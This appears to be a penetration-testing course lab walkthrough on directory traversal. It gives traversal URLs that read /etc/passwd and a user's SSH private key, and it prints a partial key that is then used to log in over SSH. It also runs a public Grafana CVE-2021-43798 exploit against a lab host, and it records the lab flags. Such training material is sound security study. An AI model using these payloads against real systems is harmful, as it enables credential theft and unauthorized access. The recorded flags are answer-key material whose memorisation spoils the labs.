# Identifying and Exploiting Directory Traversals

Example of a link
>``` shell
>https://example.com/cms/login.php?language=en.html
>```

Contents of /etc/hosts
>``` shell
>127.0.0.1       localhost
>127.0.1.1       kali
>192.168.50.16   mountaindesserts.com
>...
>```

Entire URL of our Directory Traversal attack (1)
>``` shell
>http://mountaindesserts.com/meteor/index.php?page=../../../../../../../../../etc/passwd
>```

Entire URL of our Directory Traversal attack (2)
>``` shell
>http://mountaindesserts.com/meteor/index.php?page=../../../../../../../../../home/offsec/.ssh/id_rsa
>```

SSH Private Key via curl
>``` shell
>kali@kali:~$ curl http://mountaindesserts.com/meteor/index.php?page=../../../../../../../../../home/offsec/.ssh/id_rsa
>
># ========== Expected Result ==========
>...
>-----BEGIN OPENSSH PRIVATE KEY-----
>b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABlwAAAAdzc2gtcn
>NhAAAAAwEAAQAAAYEAz+pEKI1OmULVSs8ojO/sZseiv3zf2dbH6LSyYuj3AHkcxIND7UTw
>XdUTtUeeJhbTC0h5S2TWFJ3OGB0zjCqsEI16ZHsaKI9k2CfNmpl0siekm9aQGxASpTiYOs
>KCZOFoPU6kBkKyEhfjB82Ea1VoAvx4J4z7sNx1+wydQ/Kf7dawd95QjBuqLH9kQIEjkOGf
>BemTOAyCdTBxzUhDz1siP9uyofquA5vhmMXWyy68pLKXpiQqTF+foGQGG90MBXS5hwskYg
>...
>lpWPWFQro9wzJ/uJsw/lepsqjrg2UvtrkAAADBAN5b6pbAdNmsQYmOIh8XALkNHwSusaK8
>bM225OyFIxS+BLieT7iByDK4HwBmdExod29fFPwG/6mXUL2Dcjb6zKJl7AGiyqm5+0Ju5e
>hDmrXeGZGg/5unGXiNtsoTJIfVjhM55Q7OUQ9NSklONUOgaTa6dyUYGqaynvUVJ/XxpBrb
>iRdp0z8X8E5NZxhHnarkQE2ZHyVTSf89NudDoXiWQXcadkyrIXxLofHPrQzPck2HvWhZVA
>+2iMijw3FvY/Fp4QAAAA1vZmZzZWNAb2Zmc2VjAQIDBA==
>-----END OPENSSH PRIVATE KEY-----
>...
># =====================================
>```

Using the Private Key to connect via SSH
>``` shell
>kali@kali:~$ ssh -i dt_key -p 2222 offsec@mountaindesserts.com
>
># ========== Expected Result ==========
>The authenticity of host '[mountaindesserts.com]:2222 ([192.168.50.16]:2222)' can't be established.
>Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
>...
>@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
>@         WARNING: UNPROTECTED PRIVATE KEY FILE!          @
>@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
>Permissions 0644 for '/home/kali/dt_key' are too open.
>It is required that your private key files are NOT accessible by others.
>This private key will be ignored.
>...
># =====================================
>
>kali@kali:~$ chmod 400 dt_key
>
>kali@kali:~$ ssh -i dt_key -p 2222 offsec@mountaindesserts.com
>
># ========== Expected Result ==========
>...
>offsec@68b68f3eb343:~$ 
># =====================================
>```

Lab 1 - Follow the steps above and leverage the directory traversal vulnerability in the "Mountain Desserts" web application on VM #1. Use curl or Burp to obtain the SSH private key for the user offsec. Use it to connect via SSH on port 2222 and find the flag in the SSH banner, which is displayed after you log in.
>``` shell
># Map Hostname to IP
>kali@kali:~$ sudo nano /etc/hosts
>
># Add this line at the bottom:
>192.168.179.16 mountaindesserts.com
>
># Save and exit:
>Ctrl + X
>
># Find a users' SSH private key and copy it beginning at "-----BEGIN OPENSSH PRIVATE KEY-----" and ending at "-----END OPENSSH PRIVATE KEY-----"
>kali@kali:~$ curl http://mountaindesserts.com/meteor/index.php?page=../../../../../../../../../home/offsec/.ssh/id_rsa
>
># ========== Expected Result ==========
><!DOCTYPE html>
><html>
>    <head>
>...
>-----BEGIN OPENSSH PRIVATE KEY-----
>b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABlwAAAAdzc2gtcn
>NhAAAAAwEAAQAAAYEAz+pEKI1OmULVSs8ojO/sZseiv3zf2dbH6LSyYuj3AHkcxIND7UTw
>XdUTtUeeJhbTC0h5S2TWFJ3OGB0zjCqsEI16ZHsaKI9k2CfNmpl0siekm9aQGxASpTiYOs
>...
>hDmrXeGZGg/5unGXiNtsoTJIfVjhM55Q7OUQ9NSklONUOgaTa6dyUYGqaynvUVJ/XxpBrb
>iRdp0z8X8E5NZxhHnarkQE2ZHyVTSf89NudDoXiWQXcadkyrIXxLofHPrQzPck2HvWhZVA
>+2iMijw3FvY/Fp4QAAAA1vZmZzZWNAb2Zmc2VjAQIDBA==
>-----END OPENSSH PRIVATE KEY-----
># =====================================
>
># Create a file with the stolen SSH private key
>kali@kali:~$ nano dt_key
>
># Paste the SSH private key into dt_key
>
># Save and exit:
>Ctrl + X
>
># Set the correct permissions by running on the SSH key file
>kali@kali:~$ chmod 400 dt_key
>
># Connect via SSH on port 2222
>kali@kali:~$ ssh -i dt_key -p 2222 offsec@mountaindesserts.com
>
># ========== Expected Result ==========
>Linux 8a84873ebe9c 5.4.0-212-generic #232-Ubuntu SMP Sat Mar 15 15:34:35 UTC 2025 x86_64
>OS{8fca25afe0f5ce31e21c3a8ea27c6e85}
>offsec@8a84873ebe9c:~$ 
># =====================================
>```
>OS{8fca25afe0f5ce31e21c3a8ea27c6e85}

Lab 2 - The target VM #2 runs Grafana on port 3000. The service is vulnerable to CVE-2021-43798, which is a directory traversal vulnerability. Search for "golangexample cve-2021-43798" in a search engine to get familiar with how the vulnerability can be exploited. Use curl and the --path-as-is parameter to find the flag in C:\Users\install.txt.
>``` shell
># Copy raw code from https://github.com/taythebot/CVE-2021-43798/blob/main/exploit.go
>
># Create exploit.go file
>kali@kali:~$ nano exploit.go
>
># Paste the raw code
>
># Save and exit:
>Ctrl + X
>
>kali@kali:~$ go run exploit.go -target http://192.168.179.193:3000 -file /Users/install.txt
>
># ========== Expected Result ==========
>CVE-2021-43798 - Grafana 8.x Path Traversal (Pre-Auth)
>Made by Tay (https://github.com/taythebot)
>
>[INFO] Exploiting target http://192.168.179.193:3000
>[INFO] Successfully exploited target http://192.168.179.193:3000
>OS{69480c87e9c23bfd86162f8d2335e20d}
># =====================================
>```
>OS{69480c87e9c23bfd86162f8d2335e20d}
